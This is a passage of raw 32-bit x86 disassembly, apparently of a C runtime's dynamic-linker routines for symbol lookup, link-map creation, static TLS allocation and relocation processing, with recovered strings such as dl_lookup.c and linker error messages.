cmovne edx, eax
xor ebx, ebx
mov dword [var_bp_10h], edx
mov eax, dword [ebp + ebx*4 - 0x2c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 7
jbe 0x807e7f9
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_37h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x2c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 7
mov edx, eax
jbe 0x807e820
mov ecx, dword [var_5ch]
cmp byte [ecx], 0
jne 0x807e871
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
xor eax, eax
mov ecx, str.relocation_error
mov dword [esp], esi
call fcn.08081380
mov eax, dword [var_54h]
sub esp, 4
mov dword [eax], 0
jmp 0x807e6ba
mov edx, dword [var_5ch]
jmp 0x807e851
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0x100
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.version_____void__0_
call fcn.0805efc0
mov eax, dword [arg_8h]
mov ecx, dword [arg_18h]
mov edx, dword [eax]
mov eax, dword [edx]
mov dword [var_68h], edx
cmp dword [eax], ecx
je 0x807e8b9
nop
lea esi, [esi]
inc esi
mov ecx, dword [arg_18h]
cmp dword [eax + esi*4], ecx
jne 0x807e8b0
mov eax, dword [var_68h]
cmp esi, dword [eax + 4]
jb 0x807e49d
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0xf0
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.i____scope___r_nlist
jmp 0x807e895
mov eax, dword [arg_14h]
test eax, eax
je 0x807e48b
cmp dword [arg_14h], 1
je 0x807e48b
mov dword [var_sp_ch], str._dl_lookup_symbol_x
mov dword [var_8h], 0xe7
mov dword [var_4h], str.dl_lookup.c
mov dword [esp], str.version____void__0___flags__0__flags__DL_LOOKUP_ADD_DEPENDENCY
jmp 0x807e895
nop
push ebp
mov ecx, eax
mov eax, dword [eax + 0x28]
mov ebp, esp
test eax, eax
je 0x807e949
mov eax, dword [eax + 4]
mov edx, dword [eax]
add eax, 8
mov dword [ecx + 0x168], eax
lea eax, [eax + edx*4]
mov dword [ecx + 0x164], edx
mov dword [ecx + 0x16c], eax
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
test byte [0x80aac10], 4
mov dword [var_4h], ebx
mov ecx, dword [edx + 4]
mov ebx, dword [arg_10h]
je 0x807e9d7
mov dword [var_10h], eax
mov edx, str.protected
mov eax, dword [arg_18h]
test eax, eax
mov eax, str.normal
cmove edx, eax
mov eax, dword [arg_ch]
mov dword [var_ch], edx
mov eax, dword [eax + 4]
mov eax, dword [eax + 4]
cmp byte [eax], 0
jne 0x807e997
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
cmp byte [ecx], 0
jne 0x807e9ec
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov dword [var_sp_4h], edx
mov dword [esp], str.binding_file__s_to__s:__s_symbol___s
call fcn.08081c40
test ebx, ebx
je 0x807e9de
mov eax, dword [ebx]
mov dword [esp], str.___s__n
mov dword [var_sp_4h], eax
call fcn.08081c70
mov ebx, dword [var_4h]
leave
ret 0x14
mov dword [esp], 0x809302e
call fcn.08081c70
jmp 0x807e9d7
mov edx, ecx
jmp 0x807e9b1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov esi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_14h], edx
mov dword [esp], edx
mov dword [var_10h], eax
call fcn.08053400
mov dword [var_4h], 1
lea edx, [eax + 1]
add eax, 0x241
mov dword [var_1ch], edx
mov dword [esp], eax
call fcn.08051730
mov edi, eax
xor eax, eax
test edi, edi
je 0x807ec09
mov edx, dword [var_1ch]
lea ebx, [edi + 0x234]
lea eax, [edi + 0x240]
mov dword [edi + 0x14], ebx
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [var_14h]
mov dword [var_4h], edx
call fcn.08053770
xor ecx, ecx
mov dword [edi + 0x234], eax
mov dword [ebx + 8], 1
movzx edx, byte [var_18h]
mov eax, dword [var_10h]
mov dword [edi + 0x160], esi
mov dword [edi + 0x1b0], 4
mov dword [edi + 4], eax
and edx, 3
movzx eax, byte [edi + 0x174]
and eax, 0xfffffffc
or eax, edx
lea edx, [edi + 0x1a0]
mov byte [edi + 0x174], al
mov dword [edi + 0x1b4], edx
mov eax, dword [0x80aac58]
test eax, eax
je 0x807ec40
mov edx, eax
mov eax, dword [eax + 0xc]
test eax, eax
je 0x807ead9
lea esi, [esi]
mov edx, eax
mov eax, dword [eax + 0xc]
test eax, eax
jne 0x807ead0
mov eax, dword [0x80aac58]
mov dword [edi + 0x10], edx
mov dword [edx + 0xc], edi
mov edx, dword [edi + 0x1b4]
add eax, 0x150
mov dword [edx + ecx*4], eax
mov ecx, 1
inc dword [0x80aabf8]
add dword [0x80aac18], 1
adc dword [0x80aac1c], 0
test esi, esi
je 0x807ec34
mov eax, dword [esi + 0x160]
test eax, eax
je 0x807eb2c
lea esi, [esi]
mov esi, eax
mov eax, dword [eax + 0x160]
test eax, eax
jne 0x807eb20
test ecx, ecx
lea eax, [esi + 0x150]
je 0x807eb3a
cmp eax, dword [edx]
je 0x807eb3d
mov dword [edx + ecx*4], eax
mov edx, dword [var_10h]
lea eax, [edi + 0x150]
mov dword [edi + 0x1b8], eax
movzx ebx, byte [edx]
test bl, bl
je 0x807ec07
mov dword [esp], edx
call fcn.08053400
inc eax
cmp bl, 0x2f
mov dword [var_20h], eax
je 0x807ec22
mov ebx, dword [var_20h]
mov dword [var_24h], 0
xor esi, esi
sub ebx, 0xffffff80
mov dword [esp], esi
mov dword [var_4h], ebx
call fcn.08051220
test eax, eax
je 0x807ebaf
mov esi, eax
mov eax, ebx
sub eax, dword [var_20h]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08079700
test eax, eax
mov dword [var_24h], eax
jne 0x807ebb6
call fcn.08048b20
cmp dword [eax], 0x22
je 0x807eb78
mov eax, dword [var_24h]
test eax, eax
je 0x807ec13
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.08076ce0
cmp byte [eax - 1], 0x2f
mov edx, eax
je 0x807ebd2
mov byte [eax], 0x2f
inc edx
mov eax, dword [var_20h]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.08053740
mov edx, eax
lea esi, [esi]
dec edx
cmp byte [edx], 0x2f
jne 0x807ebf0
lea eax, [esi + 1]
cmp edx, esi
cmove edx, eax
mov byte [edx], 0
mov dword [edi + 0x190], esi
mov eax, edi
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret 4
mov dword [esp], esi
call fcn.08051180
mov esi, 0xffffffff
jmp 0x807ec01
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
mov edx, eax
jne 0x807ebd2
jmp 0x807ec1b
mov esi, edi
jmp 0x807eb2c
nop
lea esi, [esi]
mov dword [0x80aac58], edi
jmp 0x807eaf7
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov esi, dword [eax + 0x21c]
mov ebx, eax
cmp esi, dword [0x80aabd4]
ja 0x807ed0e
mov edx, dword [0x80aabd0]
mov eax, dword [0x80a95a4]
mov edi, dword [ebx + 0x220]
sub eax, edx
mov dword [var_sp_4h], edx
lea ecx, [eax - 0x420]
mov eax, dword [ebx + 0x218]
add eax, edi
cmp ecx, eax
jb 0x807ed0e
mov edx, ecx
sub edx, eax
mov eax, edx
xor edx, edx
div esi
imul eax, esi
sub ecx, eax
mov eax, dword [var_sp_4h]
sub ecx, edi
add eax, ecx
test byte [ebx + 0x174], 4
mov dword [0x80aabd0], eax
mov dword [ebx + 0x224], eax
jne 0x807ed03
or byte [ebx + 0x175], 4
mov ebx, dword [var_sp_8h]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
ret
mov dword [esp], ebx
call dword [0x80a95bc]
jmp 0x807ecf8
mov edx, dword [ebx + 4]
xor ecx, ecx
xor eax, eax
mov dword [esp], str.cannot_allocate_memory_in_static_TLS_block
call fcn.08081200
jmp 0x807ed30
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov edx, dword [var_8h_2]
mov dword [var_8h_3], ebx
mov dword [var_4h_2], esi
mov ebx, dword gs:[8]
sub ebx, dword [edx + 0x224]
mov ecx, dword gs:[4]
mov eax, dword [edx + 0x228]
mov dword [ecx + eax*4], ebx
mov eax, dword [edx + 0x214]
mov esi, dword [edx + 0x218]
mov dword [var_sp_8h], eax
sub esi, eax
mov eax, dword [edx + 0x210]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.08053740
mov dword [var_sp_4h], 0
mov dword [var_sp_8h], esi
mov dword [esp], eax
call fcn.080536f0
mov ebx, dword [var_8h_3]
mov esi, dword [var_4h_2]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
lea eax, [arg_8h]
push ebx
sub esp, 0xdc
mov esi, dword [arg_8h]
mov dword [var_68h], 0
mov dword [var_14h], eax
test byte [esi + 0x174], 4
jne 0x807f1e5
mov eax, dword [arg_14h]
test eax, eax
jne 0x807ede1
mov eax, dword [esi + 0x78]
mov edx, 0
test eax, eax
cmove edx, dword [var_10h_2]
mov dword [var_10h_2], edx
test byte [0x80aac10], 0x20
jne 0x8080066
mov eax, dword [esi + 0x70]
test eax, eax
jne 0x807ffa9
mov eax, dword [esi + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_10h], eax
mov eax, dword [esi + 0x74]
test eax, eax
je 0x807ee43
mov eax, dword [var_10h_2]
test eax, eax
je 0x807ee43
mov eax, dword [esi + 0x24]
mov edx, dword [eax + 4]
mov eax, dword [edx + 4]
test eax, eax
je 0x807ee2e
add eax, dword [esi]
mov dword [esi + 0x1f8], eax
lea eax, [edx + 0xc]
mov dword [esi + 0x1fc], eax
mov dword [edx + 4], esi
mov edi, dword [var_14h_2]
test edi, edi
jne 0x807ff84
mov dword [edx + 8], 0x8081190
mov eax, dword [esi + 0x5c]
mov dword [var_2ch], 0
mov dword [var_24h], 0
mov dword [var_30h], 0
mov dword [var_34h], 0
test eax, eax
je 0x807ee75
mov eax, dword [eax + 4]
mov dword [var_34h_2], eax
mov eax, dword [esi + 0x60]
mov eax, dword [eax + 4]
mov dword [var_30h_2], eax
mov eax, dword [esi + 0x68]
test eax, eax
je 0x807ee86
cmp dword [eax + 4], 0x11
je 0x807ff46
mov dword [var_6ch], 0
mov edi, dword [var_6ch]
mov ecx, dword [esi]
mov dword [var_70h], esi
lea eax, [edi + edi*2]
mov dword [var_7ch], ecx
lea eax, [ebp + eax*4 - 0xc]
lea edx, [eax - 0x28]
mov ebx, dword [eax - 0x28]
mov eax, dword [edx + 4]
mov edx, dword [edx + 8]
mov edi, ebx
mov dword [var_74h], eax
add eax, ebx
test edx, edx
mov dword [var_78h], eax
je 0x807f875
cmp ebx, eax
jae 0x807eef0
movzx edx, byte [edi + 4]
mov ecx, dword [var_7ch_2]
add ecx, dword [edi]
cmp edx, 7
jne 0x807f869
mov edx, dword [esi + 0x1f8]
test edx, edx
jne 0x807f857
mov ebx, dword [var_7ch_2]
add dword [ecx], ebx
add edi, 8
cmp edi, dword [var_78h_2]
jb 0x807eec1
mov esi, esi
inc dword [var_6ch]
cmp dword [var_6ch], 1
jle 0x807ee8d
mov eax, dword [esi + 0x34]
mov dword [var_4ch], 0
mov dword [var_44h], 0
mov dword [var_50h], 0
mov dword [var_54h], 0
test eax, eax
je 0x807ef2b
mov eax, dword [eax + 4]
mov dword [var_54h], eax
mov eax, dword [esi + 0x38]
mov eax, dword [eax + 4]
mov dword [var_50h], eax
mov eax, dword [esi + 0x68]
test eax, eax
je 0x807ef3c
cmp dword [eax + 4], 7
je 0x807f819
mov dword [var_a4h], 0
mov ecx, dword [var_a4h]
mov dword [var_a8h], esi
lea eax, [ecx + ecx*2]
lea eax, [ebp + eax*4 - 0xc]
mov edx, dword [eax - 0x48]
mov edi, dword [eax - 0x44]
mov eax, dword [esi]
lea ebx, [edi + edx]
mov dword [var_b4h], eax
mov dword [var_b0h], ebx
mov eax, dword [esi + 0x30]
xor ebx, ebx
mov eax, dword [eax + 4]
mov dword [var_b8h], eax
mov eax, dword [esi + 0xb8]
test eax, eax
je 0x807ef8b
mov ebx, dword [eax + 4]
mov ecx, edx
mov eax, edi
mov edx, 0xaaaaaaab
mul edx
shr edx, 3
cmp edx, ebx
cmova edx, ebx
cmp esi, 0
lea edx, [edx + edx*2]
lea edx, [ecx + edx*4]
mov dword [var_ach], edx
je 0x807efee
mov ebx, dword [var_b4h]
test ebx, ebx
jne 0x807efc6
mov edx, dword [esi + 0x114]
test edx, edx
jne 0x807efee
cmp ecx, dword [var_ach]
jae 0x807efee
mov esi, esi
mov edx, dword [var_b4h]
mov eax, dword [var_b4h]
add edx, dword [ecx]
add eax, dword [ecx + 8]
add ecx, 0xc
cmp ecx, dword [var_ach]
mov dword [edx], eax
jb 0x807efd0
mov eax, dword [esi + 0xdc]
test eax, eax
je 0x807f4bc
mov edx, dword [var_b0h]
mov eax, dword [eax + 4]
cmp dword [var_ach], edx
mov dword [var_bch], eax
jae 0x807f1b0
mov ecx, dword [var_ach]
mov edi, dword [var_bch]
mov ebx, dword [ecx + 4]
mov ecx, dword [var_b8h]
mov eax, ebx
shr eax, 8
movzx edx, word [edi + eax*2]
mov edi, dword [var_ach]
shl eax, 4
add ecx, eax
mov eax, dword [var_a8h]
mov dword [var_60h], ecx
and dx, 0x7fff
movzx edx, dx
shl edx, 4
add edx, dword [eax + 0x17c]
mov eax, dword [var_b4h]
add eax, dword [edi]
movzx edi, bl
cmp edi, 8
mov dword [var_c0h], eax
je 0x807f49e
test edi, edi
je 0x807f190
mov dword [var_c4h], ecx
movzx eax, byte [ecx + 0xc]
mov dword [var_c8h], esi
shr al, 4
test al, al
je 0x807f156
cmp ecx, dword [esi + 0x200]
je 0x807f44a
xor eax, eax
cmp edi, 7
je 0x807f440
cmp edi, 0x23
je 0x807f440
cmp edi, 0x24
je 0x807f440
cmp edi, 0x25
je 0x807f440
cmp edi, 0xe
je 0x807f440
mov ecx, eax
mov ebx, 1
or eax, 2
cmp edi, 5
cmove ecx, eax
mov eax, dword [var_c4h]
mov dword [esi + 0x204], ecx
mov dword [esi + 0x200], eax
xor esi, esi
test edx, edx
je 0x807f105
mov eax, dword [edx + 4]
test eax, eax
je 0x807f105
mov esi, edx
xor ebx, ebx
mov eax, dword [var_60h]
mov edx, dword [arg_ch]
mov eax, dword [eax]
mov dword [esp], edx
mov dword [var_4h], esi
add eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_8h], ecx
lea ecx, [var_60h]
mov dword [var_sp_ch], ebx
mov dword [var_sp_10h], 0
call fcn.0807e450
mov ecx, dword [var_60h]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_c8h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
mov edx, dword [var_ach]
mov ebx, dword [edx + 4]
xor esi, esi
test ecx, ecx
je 0x807f167
mov eax, dword [var_c8h]
mov esi, dword [ecx + 4]
add esi, dword [eax]
movzx eax, bl
cmp eax, 0x25
ja case.0x807f173.0
jmp dword [eax*4 + 0x80a41a0]
mov edx, dword [var_ach]
mov ecx, dword [var_c0h]
add esi, dword [edx + 8]
mov dword [ecx], esi
mov esi, dword [arg_8h]
mov esi, esi
add dword [var_ach], 0xc
mov eax, dword [var_b0h]
cmp dword [var_ach], eax
jb 0x807f017
lea esi, [esi]
inc dword [var_a4h]
cmp dword [var_a4h], 1
jle 0x807ef46
mov eax, dword [arg_14h]
test eax, eax
jne 0x807f23e
or byte [esi + 0x174], 4
mov ecx, dword [var_68h]
test ecx, ecx
jne 0x807f1f4
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x230]
test edx, edx
jne 0x807f1ed
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
call 0x80800d0
jmp 0x807f1e5
mov edx, dword [var_68h]
mov eax, dword [edx + 8]
mov dword [var_8h], eax
mov eax, dword [edx + 4]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.080547a0
test eax, eax
js 0x807f222
mov ecx, dword [var_68h]
mov ecx, dword [ecx + 0xc]
test ecx, ecx
mov dword [var_68h], ecx
je 0x807f1d8
jmp 0x807f1f4
mov ebx, str.cannot_restore_segment_prot_after_reloc
call fcn.08048b20
xor ecx, ecx
mov edx, dword [arg_8h]
mov edx, dword [edx + 4]
mov dword [esp], ebx
mov eax, dword [eax]
call fcn.08081200
mov edi, dword [esi + 0x20]
test edi, edi
je 0x807f2af
mov eax, dword [esi + 0x20]
mov eax, dword [eax + 4]
mov dword [esp], 4
mov dword [var_4h], eax
call fcn.08051730
mov dword [esi + 0x188], eax
mov esi, dword [arg_8h]
mov ebx, dword [esi + 0x188]
test ebx, ebx
jne 0x807f1ca
mov ebx, str._s:_profiler_out_of_memory_shadowing_PLTREL_of__s_n
mov eax, dword [0x80a95a8]
mov edx, str._program_name_unknown_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov eax, dword [esi + 4]
mov dword [esp], 2
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
mov ebx, str._s:_profiler_found_no_PLTREL_in_object__s_n
jmp 0x807f277
mov ebx, dword [var_ach]
mov edi, dword [var_c0h]
add esi, dword [ebx + 8]
sub esi, dword [var_c0h]
mov dword [edi], esi
jmp 0x807f18b
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c4h]
mov edx, dword [ebx + 8]
cmp dword [ecx + 8], edx
ja 0x807f316
jb 0x807f30d
mov eax, dword [ecx + 8]
mov edi, dword [var_c0h]
mov dword [var_4h], esi
cmp edx, eax
mov dword [esp], edi
cmovbe eax, edx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x807f18b
mov eax, dword [0x80aac54]
test eax, eax
je 0x807f2ea
mov eax, dword [0x80a95a8]
mov edi, dword [var_a8h]
mov edx, str._program_name_unknown_
mov ebx, dword [var_c4h]
mov eax, dword [eax]
mov ecx, dword [edi + 0x2c]
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov ecx, dword [var_60h]
mov edx, dword [ebx + 8]
jmp 0x807f2ea
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c8h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807f392
mov eax, dword [ecx + 4]
mov edi, dword [var_ach]
sub eax, edx
add eax, dword [edi + 8]
mov edx, dword [var_c0h]
mov dword [edx], eax
jmp 0x807f18b
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_60h]
mov edx, dword [ebx + 0x224]
jmp 0x807f377
xor ecx, ecx
mov edx, edi
mov eax, dword [var_a8h]
mov esi, esi
call 0x8080140
mov eax, dword [var_c8h]
test eax, eax
je 0x807f18b
mov edx, dword [var_c8h]
mov ecx, dword [var_c0h]
mov eax, dword [edx + 0x228]
mov dword [ecx], eax
jmp 0x807f18b
test ecx, ecx
je 0x807f3ee
mov ebx, dword [var_ach]
mov eax, dword [ebx + 8]
add eax, dword [ecx + 4]
jmp 0x807f385
mov edi, dword [var_ach]
mov eax, dword [edi + 8]
jmp 0x807f385
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c8h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807f42a
mov edi, dword [var_ach]
sub edx, dword [ecx + 4]
mov eax, dword [var_c0h]
add edx, dword [edi + 8]
mov dword [eax], edx
jmp 0x807f18b
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_60h]
mov edx, dword [ebx + 0x224]
jmp 0x807f411
lea esi, [esi]
mov eax, 1
jmp 0x807f0d2
xor ecx, ecx
cmp edi, 7
je 0x807f497
cmp edi, 0x23
je 0x807f497
cmp edi, 0x24
je 0x807f497
cmp edi, 0x25
je 0x807f497
cmp edi, 0xe
je 0x807f497
cmp edi, 5
mov eax, dword [esi + 0x204]
je 0x807f492
cmp ecx, eax
jne 0x807f0a3
mov ecx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_60h], ecx
mov dword [var_c8h], esi
jmp 0x807f156
or ecx, 2
jmp 0x807f470
mov ecx, 1
jmp 0x807f465
mov edx, dword [var_ach]
mov ecx, dword [var_a8h]
mov ebx, dword [var_c0h]
mov eax, dword [edx + 8]
add eax, dword [ecx]
mov dword [ebx], eax
jmp 0x807f190
mov edx, dword [var_b0h]
cmp dword [var_ach], edx
jae 0x807f1b0
mov esi, esi
mov ecx, dword [var_ach]
mov edi, dword [var_b4h]
mov edx, dword [var_b8h]
mov ebx, dword [ecx + 4]
add edi, dword [ecx]
mov eax, ebx
shr eax, 8
mov dword [var_cch], edi
movzx edi, bl
shl eax, 4
add edx, eax
cmp edi, 8
mov dword [var_64h], edx
je 0x807f801
test edi, edi
je 0x807f614
mov dword [var_d0h], edx
movzx eax, byte [edx + 0xc]
mov dword [var_d4h], esi
shr al, 4
test al, al
je 0x807f5dc
cmp edx, dword [esi + 0x200]
je 0x807f7ad
xor eax, eax
cmp edi, 7
je 0x807f7a3
cmp edi, 0x23
je 0x807f7a3
cmp edi, 0x24
je 0x807f7a3
cmp edi, 0x25
je 0x807f7a3
cmp edi, 0xe
je 0x807f7a3
mov edx, eax
mov ebx, dword [var_d0h]
lea ecx, [var_64h]
or edx, 2
cmp edi, 5
cmovne edx, eax
mov eax, dword [var_64h]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], ebx
mov eax, dword [eax]
mov dword [var_4h], 0
mov dword [var_8h], edx
mov edx, dword [arg_ch]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 1
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_64h]
mov edx, dword [arg_8h]
mov dword [var_d4h], eax
sub esp, 0x14
mov dword [edx + 0x208], eax
mov dword [edx + 0x20c], ecx
mov eax, dword [var_ach]
mov edx, ecx
mov ebx, dword [eax + 4]
xor esi, esi
test edx, edx
je 0x807f5ed
mov ecx, dword [var_d4h]
mov esi, dword [edx + 4]
add esi, dword [ecx]
movzx eax, bl
cmp eax, 0x25
ja case.0x807f173.0
jmp dword [eax*4 + 0x80a4238]
mov ebx, dword [var_ach]
mov edi, dword [var_cch]
add esi, dword [ebx + 8]
mov dword [edi], esi
mov esi, dword [arg_8h]
add dword [var_ach], 0xc
mov eax, dword [var_b0h]
cmp dword [var_ach], eax
jb 0x807f4d0
jmp 0x807f1b0
mov eax, dword [var_ach]
mov edx, dword [var_cch]
add esi, dword [eax + 8]
sub esi, dword [var_cch]
mov dword [edx], esi
jmp 0x807f611
test edx, edx
je 0x807f611
mov ebx, dword [var_d0h]
mov ecx, dword [ebx + 8]
cmp dword [edx + 8], ecx
ja 0x807f688
jb 0x807f67f
mov eax, dword [edx + 8]
mov edi, dword [var_cch]
mov dword [var_4h], esi
cmp ecx, eax
mov dword [esp], edi
cmovbe eax, ecx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x807f611
mov eax, dword [0x80aac54]
test eax, eax
je 0x807f65f
mov eax, dword [0x80a95a8]
mov edi, dword [var_a8h]
mov edx, str._program_name_unknown_
mov ebx, dword [var_d0h]
mov eax, dword [eax]
mov ecx, dword [edi + 0x2c]
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov edx, dword [var_64h]
mov ecx, dword [ebx + 8]
jmp 0x807f65f
test edx, edx
je 0x807f611
mov ecx, dword [var_d4h]
mov ebx, dword [ecx + 0x224]
test ebx, ebx
je 0x807f704
mov eax, dword [edx + 4]
mov edx, dword [var_ach]
sub eax, ebx
add eax, dword [edx + 8]
mov ecx, dword [var_cch]
mov dword [ecx], eax
jmp 0x807f611
mov eax, ecx
call fcn.0807ec80
mov edi, dword [var_d4h]
mov edx, dword [var_64h]
mov ebx, dword [edi + 0x224]
jmp 0x807f6e9
mov eax, dword [var_d4h]
test eax, eax
je 0x807f611
mov ecx, dword [var_d4h]
mov ebx, dword [var_cch]
mov eax, dword [ecx + 0x228]
mov dword [ebx], eax
jmp 0x807f611
test edx, edx
je 0x807f755
mov edi, dword [var_ach]
mov eax, dword [edi + 8]
add eax, dword [edx + 4]
jmp 0x807f6f7
mov edx, dword [var_ach]
mov eax, dword [edx + 8]
jmp 0x807f6f7
test edx, edx
je 0x807f611
mov edi, dword [var_d4h]
mov ebx, dword [edi + 0x224]
test ebx, ebx
je 0x807f791
mov eax, dword [var_ach]
sub ebx, dword [edx + 4]
mov edx, dword [var_cch]
add ebx, dword [eax + 8]
mov dword [edx], ebx
jmp 0x807f611
mov eax, edi
call fcn.0807ec80
mov edx, dword [var_64h]
mov ebx, dword [edi + 0x224]
jmp 0x807f778
mov eax, 1
jmp 0x807f564
xor edx, edx
cmp edi, 7
je 0x807f7fa
cmp edi, 0x23
je 0x807f7fa
cmp edi, 0x24
je 0x807f7fa
cmp edi, 0x25
je 0x807f7fa
cmp edi, 0xe
je 0x807f7fa
cmp edi, 5
mov eax, dword [esi + 0x204]
je 0x807f7f5
cmp edx, eax
jne 0x807f535
mov edx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_64h], edx
mov dword [var_d4h], esi
jmp 0x807f5dc
or edx, 2
jmp 0x807f7d3
mov edx, 1
jmp 0x807f7c8
mov edx, dword [var_a8h]
mov eax, dword [ecx + 8]
mov ecx, dword [var_cch]
add eax, dword [edx]
mov dword [ecx], eax
jmp 0x807f614
mov edi, dword [arg_10h]
mov eax, dword [esi + 0x74]
test edi, edi
mov ecx, dword [eax + 4]
jne 0x807f832
mov edx, dword [var_50h]
mov eax, dword [var_54h]
add eax, edx
cmp eax, ecx
je 0x807f849
mov eax, dword [esi + 0x20]
mov dword [var_48h], ecx
mov edx, dword [arg_10h]
mov eax, dword [eax + 4]
mov dword [var_40h], edx
mov dword [var_44h], eax
jmp 0x807ef3c
mov eax, dword [esi + 0x20]
add edx, dword [eax + 4]
mov dword [var_50h], edx
jmp 0x807ef3c
mov eax, ecx
sub eax, dword [esi + 0x1fc]
lea eax, [edx + eax*4]
mov dword [ecx], eax
jmp 0x807eee6
mov ecx, 1
mov eax, esi
jmp 0x807f3b0
mov eax, dword [esi + 0x30]
xor ecx, ecx
mov eax, dword [eax + 4]
mov dword [var_80h], eax
mov eax, dword [esi + 0xb4]
test eax, eax
je 0x807f88d
mov ecx, dword [eax + 4]
mov eax, dword [var_74h]
mov edx, ebx
shr eax, 3
cmp eax, ecx
cmova eax, ecx
cmp esi, 0
lea edi, [ebx + eax*8]
je 0x807f8d0
mov eax, dword [var_7ch]
test eax, eax
je 0x807f8d0
cmp ebx, edi
jae 0x807f8d0
mov eax, dword [var_7ch]
add eax, dword [edx]
cmp byte [edx + 4], 8
jne 0x80800a3
add edx, 8
mov ecx, dword [var_7ch_2]
add dword [eax], ecx
cmp edx, edi
jb 0x807f8b0
nop
lea esi, [esi]
mov eax, dword [esi + 0xdc]
test eax, eax
je 0x807fc40
cmp edi, dword [var_78h]
mov eax, dword [eax + 4]
mov dword [var_84h], eax
jae 0x807eef0
mov eax, dword [edi + 4]
mov ebx, dword [var_84h]
mov edx, eax
shr edx, 8
movzx ecx, word [ebx + edx*2]
mov ebx, dword [var_70h]
shl edx, 4
add edx, dword [var_80h]
and cx, 0x7fff
movzx ecx, cx
mov dword [var_58h], edx
shl ecx, 4
add ecx, dword [ebx + 0x17c]
mov ebx, dword [var_7ch]
add ebx, dword [edi]
mov dword [var_88h], ebx
movzx ebx, al
cmp ebx, 8
je 0x807fc2a
test ebx, ebx
je 0x807fa53
mov dword [var_8ch], edx
movzx eax, byte [edx + 0xc]
mov dword [var_90h], esi
shr al, 4
test al, al
je 0x807fa23
cmp edx, dword [esi + 0x200]
je 0x807fbd6
xor eax, eax
cmp ebx, 7
je 0x807fbcc
cmp ebx, 0x23
je 0x807fbcc
cmp ebx, 0x24
je 0x807fbcc
cmp ebx, 0x25
je 0x807fbcc
cmp ebx, 0xe
je 0x807fbcc
mov edx, eax
mov dword [var_94h], 0
or eax, 2
cmp ebx, 5
cmove edx, eax
test ecx, ecx
mov eax, dword [var_8ch]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], eax
mov esi, 1
je 0x807f9d3
mov eax, dword [ecx + 4]
test eax, eax
je 0x807f9d3
